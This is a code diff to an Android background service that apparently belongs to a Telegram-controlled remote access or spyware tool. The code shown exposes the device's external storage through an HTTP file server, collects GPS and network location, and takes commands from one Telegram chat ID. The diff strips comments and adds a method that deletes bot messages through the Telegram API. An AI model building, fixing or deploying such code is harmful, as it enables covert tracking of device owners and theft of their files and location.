@@ -34,7 +34,6 @@ import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
@@ -51,6 +50,7 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -550,7 +550,7 @@ public class MainService extends Service {
         }).start();
     }
 
-    // ── File server (enhanced with ID, JSON API, and advertisement) ──
+    // ── File server ──
     private String currentFileServerId = null;
 
     private String generateFileServerId() {
@@ -573,7 +573,6 @@ public class MainService extends Service {
                 String ip = getLocalIpAddress();
                 currentFileServerId = generateFileServerId();
 
-                // Store ad locally
                 JSONObject ad = new JSONObject();
                 ad.put("ip", ip);
                 ad.put("port", port);
@@ -624,7 +623,6 @@ public class MainService extends Service {
                 String path = line.split(" ")[1];
                 if (method.equals("GET")) {
                     if (path.startsWith("/api/list")) {
-                        // JSON file listing
                         String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
                         String dirPath = "";
                         if (query.startsWith("path=")) {
@@ -669,7 +667,6 @@ public class MainService extends Service {
                             out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
                         }
                     } else {
-                        // Normal file/directory serving
                         File root = Environment.getExternalStorageDirectory();
                         if (path.equals("/")) {
                             StringBuilder html = new StringBuilder("<html><body><h1>Files</h1><ul>");
@@ -733,14 +730,12 @@ public class MainService extends Service {
         if (locationManager == null)
             locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
 
-        // Try last known
         Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
         if (lastLoc == null)
             lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
         if (lastLoc != null)
             processLocation(lastLoc);
 
-        // Request single fresh update
         try {
             locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                 @Override public void onLocationChanged(Location loc) { processLocation(loc); }
@@ -870,6 +865,7 @@ public class MainService extends Service {
         return "File";
     }
 
+    // ── Telegram long polling ──
     private void listenTelegram() {
         while (running) {
             try {
@@ -899,9 +895,7 @@ public class MainService extends Service {
                                 String chatId = String.valueOf(chat.getLong("id"));
                                 String text = message.has("text") ? message.getString("text") : "";
                                 if (chatId.equals(Config.CHAT_ID)) {
-                                    // Parse file server advertisements
                                     parseFileAd(text);
-
                                     if (text.equals("/start") || text.equals("/menu")) {
                                         showMainMenu();
                                     } else if (text.equals("/status")) {
@@ -921,6 +915,16 @@ public class MainService extends Service {
                 try { Thread.sleep(5000); } catch (Exception ignored) {}
             }
         }
+    }
+
+    // ── Missing deleteMessage method (added) ──
+    private void deleteMessage(int messageId) {
+        new Thread(() -> {
+            try {
+                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/deleteMessage?chat_id=" + Config.CHAT_ID + "&message_id=" + messageId;
+                getRequest(url);
+            } catch (Exception ignored) {}
+        }).start();
     }
 
     private void parseFileAd(String text) {
@@ -951,7 +955,6 @@ public class MainService extends Service {
             JSONObject ad = new JSONObject(adJson);
             String ip = ad.getString("ip");
             int port = ad.getInt("port");
-            // Store connection for later use
             getSharedPreferences("remote_conn", MODE_PRIVATE).edit()
                     .putString("ip", ip).putInt("port", port).apply();
             fetchRemoteFileList(ip, port, "");
